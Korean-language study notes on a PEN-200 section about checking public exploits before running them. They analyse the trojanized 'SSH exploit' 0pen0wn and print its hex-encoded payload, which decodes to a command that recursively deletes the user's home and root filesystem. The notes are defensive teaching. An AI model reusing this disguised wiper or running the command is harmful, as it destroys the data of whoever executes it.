# 13.1.1 한 가지 주의점

> **A Word of Caution** · PEN-200 §13.1.1

공개 익스플로잇을 내려받아 그대로 실행하면 대상이 아니라 **내 시스템과 환경**이 위험해질 수 있음. 그래서 실행 전에 코드를 읽어 무슨 일이 일어나는지 확인하는 것이 원칙임.

예시는 SSH 원격 익스플로잇으로 공개됐던 `0pen0wn`. 소스를 읽다 보면 「raw socket 때문에 root 가 필요하다」며 root 권한을 요구하는데, 이 요구 자체가 첫 의심 지점임.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

*공격자 머신에서 root 권한을 요구하는 부분*

페이로드에는 `jmpcode` 배열이 들어 있는데, 셸코드처럼 보이지만 실제로는 hex 로 인코딩된 셸 명령 문자열임. 디코드하면 정체가 드러남.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

*소스에 실린 `jmpcode` 배열 — 앞뒤의 `[...]` 는 교재 자신의 생략 표기임*

Python 으로 그대로 출력해 보면 —

```
kali@kali:~$ python3
>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

*디코드 결과 — 공격자 자신의 파일시스템을 지우는 명령*

이 한 줄이면 UNIX 계열 공격 머신의 파일시스템이 날아감. 게다가 프로그램은 이어서 공개 IRC 서버에 접속해 그 사실을 알림 — 피해에 망신까지 얹는 구조임.

이런 위험 때문에 검수를 거치는 저장소를 우선함. 다만 검수하는 곳이라도 **직접 코드를 읽어 대략 무슨 동작을 하는지 파악하는 절차는 생략하지 말 것.** 프로그래밍이 익숙하지 않다면 코드 읽기 훈련 기회이기도 함.

저수준 언어로 작성돼 컴파일이 필요한 익스플로잇은 소스와 바이너리 양쪽으로 배포되는 경우가 많음. 컴파일이 번거로워도 **소스 쪽이 검사하기 쉬움** — 바이너리는 전문 도구와 기술 없이는 내용을 못 봄.

코드 검사나 컴파일이 너무 복잡하면 깨끗한 스냅샷을 잡아 둔 가상 머신을 시험용 샌드박스로 씀. 감염되거나 망가져도 스냅샷으로 되돌리면 되므로 위험이 격리됨.
